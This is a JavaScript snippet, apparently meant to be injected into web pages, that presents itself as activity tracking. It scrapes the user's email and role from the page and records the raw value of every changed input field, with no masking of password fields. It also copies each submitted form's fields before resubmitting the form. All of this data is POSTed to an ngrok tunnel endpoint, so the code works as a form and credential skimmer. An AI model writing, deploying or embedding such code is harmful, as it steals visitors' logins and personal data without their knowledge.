(function () {
    const API_ENDPOINT = "https://d8d2-27-4-42-141.ngrok-free.app/webhook";
    let sessionStartTime = Date.now();

    function getUserId() {
        return "SW-" + Math.floor(100 + Math.random() * 900);
    }

    function getUserEmail() {
        return localStorage.getItem("userEmail") || "admin@drift.com";
    }

    function getUserRole() {
        return localStorage.getItem("userRole") || "Admin";
    }

    function getUserDetailsFromPage(callback) {
        function extractDetails() {
            let emailElements = document.querySelectorAll(".email");
            let roleElement = document.querySelector(".con_foo_title");

            let email = null;

            emailElements.forEach(el => {
                if (el.innerText.includes("@") && !email) {
                    email = el.innerText.trim();
                }
            });

            let role = roleElement ? roleElement.innerText.trim() : null;

            if (email && role) {
                localStorage.setItem("userEmail", email);
                localStorage.setItem("userRole", role);
                callback(email, role);
            } else {
                setTimeout(extractDetails, 1000);
            }
        }

        extractDetails();
    }

    function sendTrackingData(eventType, extraData = {}) {
        const userId = getUserId();
        const email = getUserEmail();
        const role = getUserRole();

        const trackingData = {
            userId,
            email,
            role,
            eventType,
            timestamp: new Date().toISOString(),
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            browser: getBrowserInfo(),
            os: getOSInfo(),
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            deviceType: getDeviceType(),
            pageURL: window.location.href,
            referrer: document.referrer || "Direct",
            sessionDuration: Math.floor((Date.now() - sessionStartTime) / 1000) + "s",
            ...extraData
        };

        fetch(API_ENDPOINT, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(trackingData),
            mode: "cors"
        })
        .then(response => response.json())
        .catch((error) => console.error("❌ API Error:", error));
    }

    function getBrowserInfo() {
        let userAgent = navigator.userAgent;
        if (userAgent.includes("Chrome")) return "Chrome";
        if (userAgent.includes("Firefox")) return "Firefox";
        if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) return "Safari";
        if (userAgent.includes("Edge")) return "Edge";
        if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
        return "Unknown";
    }

    function getOSInfo() {
        let userAgent = navigator.userAgent;
        if (userAgent.includes("Windows")) return "Windows";
        if (userAgent.includes("Mac OS")) return "Mac OS";
        if (userAgent.includes("Linux")) return "Linux";
        if (userAgent.includes("Android")) return "Android";
        if (userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
        return "Unknown";
    }

    function getDeviceType() {
        let width = window.innerWidth;
        if (width <= 768) return "Mobile";
        if (width <= 1024) return "Tablet";
        return "Desktop";
    }

    // **🔴 TRACKING EVENT LISTENERS 🔴**
    document.addEventListener("click", function (event) {
        let target = event.target;

        if (target.tagName === "BUTTON") {
            sendTrackingData("Button Click", { buttonName: target.innerText.trim() });
        }

        if (target.tagName === "IMG") {
            sendTrackingData("Image Click", { imageSrc: target.src });
        }

        if (target.tagName === "A") {
            sendTrackingData("Navigation Click", { link: target.href });
        }

        if (target.tagName === "INPUT" && target.type === "checkbox") {
            sendTrackingData("Checkbox Click", { 
                checkboxName: target.name || "Unnamed Checkbox",
                checked: target.checked
            });
        }

        let card = target.closest(".card, .card-body");
        if (card) {
            let cardData = {
                cardTitle: card.querySelector(".card-title")?.innerText || "Unknown Title",
                cardDescription: card.querySelector(".card-content")?.innerText || "No Description",
                cardID: card.dataset.id || "card-1"
            };
            sendTrackingData("Card Click", cardData);
        }
    });

    document.addEventListener("change", function (event) {
        let target = event.target;

        if (target.tagName === "SELECT") {
            sendTrackingData("Dropdown Change", { 
                dropdownName: target.name || "Unnamed Dropdown",
                selectedValue: target.value
            });
        }

        if (target.tagName === "INPUT" && target.type !== "checkbox") {
            sendTrackingData("Input Change", { 
                inputName: target.name || "Unnamed Input",
                inputValue: target.value
            });
        }
    });

    document.addEventListener("focus", function (event) {
        let target = event.target;

        if (target.tagName === "INPUT" || target.tagName === "TEXTAREA") {
            sendTrackingData("Input Focus", { 
                inputName: target.name || "Unnamed Input"
            });
        }
    }, true);

    document.addEventListener("blur", function (event) {
        let target = event.target;

        if (target.tagName === "INPUT" || target.tagName === "TEXTAREA") {
            sendTrackingData("Input Blur", { 
                inputName: target.name || "Unnamed Input"
            });
        }
    }, true);

    document.addEventListener("submit", function (event) {
        if (event.target.tagName === "FORM") {
            event.preventDefault();
            const formData = {};
            new FormData(event.target).forEach((value, key) => {
                formData[key] = value;
            });
            sendTrackingData("Form Submission", { formData });
            event.target.submit();
        }
    });

    window.addEventListener("load", () => {
        getUserDetailsFromPage((email, role) => {
            sendTrackingData("Page Load");
        });
    });

    window.addEventListener("beforeunload", function () {
        sendTrackingData("Session End", { sessionDuration: Math.floor((Date.now() - sessionStartTime) / 1000) + "s" });
    });

})();
